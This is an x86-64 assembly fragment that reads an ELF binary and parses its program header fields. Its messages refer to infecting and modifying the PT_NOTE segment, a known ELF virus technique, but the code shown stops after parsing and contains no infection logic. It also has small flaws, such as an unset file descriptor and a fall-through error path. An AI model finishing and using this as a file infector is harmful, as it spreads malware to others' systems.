section .bss
    stack_buffer resb 10000          ; Allocate 10,000 bytes for ELF data

section .data
    file_open_error_msg db "Error opening file", 0xA  ; Error message
    file_open_error_len equ $ - file_open_error_msg
    
    infect_success_msg db "PT_NOTE segment successfully modified.", 0xA
    infect_success_len equ $ - infect_success_msg
    
    infect_error_msg db "PT_NOTE segment not found or error modifying.", 0xA
    infect_error_len equ $ - infect_error_msg
    
    read_error_msg db "Error reading ELF file", 0xA
    read_error_len equ $ - read_error_msg
    

section .text
global _start

_start:
    ; Open the ELF file (already done in your program) and save fd in rdi
    ; Read ELF file contents into stack_buffer
    mov rsi, stack_buffer             ; Load address of buffer
    mov rdx, 10000                    ; Maximum bytes to read
    mov rax, 0                        ; Syscall number for read()
    syscall                           ; Perform read()

    test rax, rax                     ; Check if read() failed
    js read_error                     ; Jump if negative

    ; Parse the ELF header
    mov r15, stack_buffer             ; r15 now points to the ELF data in memory

    ; Extract ELF header details
    mov cx, word [r15 + 56]           ; Number of PHT entries (e_phnum)
    mov rbx, [r15 + 32]               ; PHT offset (e_phoff)
    mov dx, word [r15 + 54]           ; PHT entry size (e_phentsize)
    
    ; Exit program
    mov rax, 60                 ; Exit syscall
    xor rdi, rdi                ; Exit code 0
    syscall

file_open_error:
    ; Handle file open error
    mov rax, 1                  ; Syscall number for write()
    mov rdi, 2                  ; File descriptor for stderr
    lea rsi, [file_open_error_msg]
    mov rdx, file_open_error_len
    syscall

    ; Exit program with error code
    mov rax, 60                 ; Exit syscall
    mov rdi, 1                  ; Exit code 1
    syscall
    
read_error:
    ; Handle read error
    mov rax, 1               ; Syscall number for write()
    mov rdi, 2               ; File descriptor for stderr
    lea rsi, [read_error_msg]
    mov rdx, read_error_len
    syscall
    
no_filename_error:
    ; Handle missing filename error
    mov rax, 1                  ; Syscall number for write()
    mov rdi, 2                  ; File descriptor for stderr
    lea rsi, [file_open_error_msg] ; Reuse the same error message
    mov rdx, file_open_error_len
    syscall

    ; Exit program with error code
    mov rax, 60                 ; Exit syscall
    mov rdi, 1                  ; Exit code 1
    syscall

